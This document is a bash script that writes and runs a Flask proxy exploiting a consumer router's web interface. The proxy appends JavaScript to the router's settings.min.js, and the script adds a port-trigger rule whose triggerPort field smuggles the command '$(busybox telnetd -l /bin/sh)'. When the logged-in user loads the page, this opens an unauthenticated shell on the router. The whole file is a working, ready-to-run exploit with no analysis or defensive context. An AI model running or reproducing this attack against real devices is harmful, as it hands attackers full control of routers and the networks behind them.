#!/bin/bash

set -e

read -p "Enter the target IP: " TARGET_IP
PORT="4000"
PYTHON_FILE="/tmp/exploit_proxy.py"

echo "[*] Starting exploit proxy server for target $TARGET_IP..."

# Create cleanup function
cleanup() {
    echo "[*] Cleaning up..."
    rm -f "$PYTHON_FILE"
    echo "[*] Done."
}
trap cleanup EXIT

cat <<EOF >"$PYTHON_FILE"
from flask import Flask, request, Response
app = Flask(__name__)

INJECT = br''';window.telnetPoll = window.setInterval(() => {
    Globals.models.PTModel.add({
        applicationName: "telnet",
        enableState: 1,
        entryId: 1,
        openPort: "2300-2400",
        openProtocol: "TCP",
        triggerPort: "\\\$(busybox telnetd -l /bin/sh)",
        triggerProtocol: "TCP"
    });
    alert("Success! You can telnet to the router.");
    window.clearInterval(window.telnetPoll);
}, 1000);'''

@app.route('/<path:path>', methods=["GET", "POST"])
@app.route('/', methods=["GET", "POST"])
def proxy(path=""):
    import requests
    url = f"http://${TARGET_IP}/" + path
    if request.query_string:
        url += "?" + request.query_string.decode()

    headers = dict(request.headers)
    headers.pop('Host', None)

    resp = requests.request(
        method=request.method,
        url=url,
        headers=headers,
        data=request.get_data(),
        cookies=request.cookies,
        allow_redirects=False,
    )

    content = resp.content
    if path == "js/settings.min.js":
        content += INJECT
        headers = dict(resp.headers)
        headers.pop('Content-Length', None)
        return Response(content, headers=headers, status=resp.status_code)

    return Response(content, headers=dict(resp.headers), status=resp.status_code)

app.run(host='127.0.0.1', port=${PORT})
EOF

echo "[*] Local proxy listening on http://127.0.0.1:${PORT}"
echo "[*] Open this URL in your browser and log in to the router UI"
echo "[*] Once the exploit is injected, telnet should be enabled on ${TARGET_IP}:23"

python3 "$PYTHON_FILE"
